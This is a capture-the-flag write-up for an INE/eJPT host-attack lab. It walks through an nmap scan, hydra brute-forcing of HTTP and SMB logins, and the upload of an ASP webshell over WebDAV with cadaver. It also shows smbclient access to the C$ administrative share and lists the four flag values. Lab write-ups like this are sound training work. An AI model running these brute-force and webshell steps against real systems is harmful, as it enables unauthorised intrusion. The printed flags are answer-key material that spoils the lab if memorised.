
# 🛡️ Host & Network Penetration Testing: System-Host Based Attacks CTF 1

**Platform:** INE / eJPT Labs
**Target IPs:**
* **Target 1:** 10.5.17.190 (`target1.ine.local`)
* **Target 2:** 10.5.26.51 (`target2.ine.local`)

---

## 🎯 Target 1: WebDAV Exploitation (10.5.17.190)

### 1. Reconnaissance
I started by identifying open ports on the first target using Nmap.


```
nmap -sV -sC -p- target1.ine.local
```
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120101204.png?raw=true)
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120101244.png?raw=true)

Findings:

* Port 80: Microsoft IIS httpd 10.0.

* The web server requires authentication.

Let's have a look at web

  ![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120101843.png?raw=true)

### 2. Vulnerability Assessment

Upon visiting the website, I was greeted with a login prompt. Given the hint that the username is bob, I decided to perform a brute-force attack to find the password.

```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt http-get target1.ine.local /
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120102341.png?raw=true)

Success! Valid credentials found:

User: bob Password: password_123321

>> bob:password_123321

Let's login 

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120102533.png?raw=true)

### 3. Enumeration & Discovery
After logging in, the root page didn't reveal much. I used dirb to discover hidden directories using the authenticated credentials.

```
dirb http://target1.ine.local/ -u bob:password_123321
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103017.png?raw=true)


let's have a look at each page

In /webdav/ directory I got my first flag 🥳

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103232.png?raw=true)



`d2eddc407e1e4b049a4023d3e16b1bc0`  this is our flag


### 4. Exploitation (WebDAV)
I tested if the WebDAV directory allowed file uploads using davtest.
```
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/ 
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103908.png?raw=true)

The results showed that I could upload files. I then used cadaver to upload a malicious ASP shell (webshell.asp) to gain remote execution.

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120103952.png?raw=true)


From web we can see the uploaded file directory

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120104123.png?raw=true)


Let's have a try with `cadaver` command

```
cadaver http://target1.ine.local/webdav/
```


![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120104512.png?raw=true)


### 5. Post-Exploitation
I accessed the uploaded shell via the browser: http://target1.ine.local/webdav/webshell.as

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120104752.png?raw=true)


we have a shell

I executed commands to navigate the C: drive and locate the second flag.

```
cd C:// && dir
```


```
cd C:// && type flag2.txt
```

this reveals our flag 🚩

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120105031.png?raw=true)


`edf1d78ca4de4873883f8b50e518bc55`  this is our flag.


---

🎯 Target 2: SMB Exploitation (10.5.26.51)

### 1. Reconnaissance
I performed a full port scan on the second target.

```
nmap -sV -sC -p- target2.ine.local
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120105437.png?raw=true)
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120105512.png?raw=true)


Findings:

* Port 445 (SMB): Running Windows Server 2019.
* Multiple other ports open

### 2. Access (Brute Force)

lets try to connect to smb
```
smbclient -L target2.ine.local
```
It has a authentication 
Lets see enum4linux
```
enum4linux target2.ine.local -SU
```
we didn't got anything


Anonymous login to SMB was disabled. I attempted to brute-force the SMB login using Hydra.

Wordlists Used:
Users: common_users.txt
Pass: unix_passwords.txt

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local 
```
![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120111029.png?raw=true)

Success! Valid credentials found for the Administrator account.

Also, we have some other logins

### 3. Exploitation & Looting
I used smbclient to list the shares available to the Administrator.

```
smbclient -L \\\\target2.ine.local\\ -U administrator
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120111741.png?raw=true)


I connected to the C$ administrative share to browse the file system.

```
smbclient \\\\target2.ine.local\\C$ -U administrator
```

![image alt](https://github.com/Adithya-satya11/images/blob/main/Pasted%20image%2020251120111956.png?raw=true)

we have a file called flag3.txt , this reveal our third flag
we have to download flag3.txt by
```
get flag3.txt 
```
`91bd8ee6611d4134a419def66f646fdb`  this is our flag


Now for flag4 , go to Users > administrator > Desktop
you can see flag4.txt file 
Download it , It will reveals our flag

`c364ecdc791040d2ad796635bbc925ca`  this is our flag.

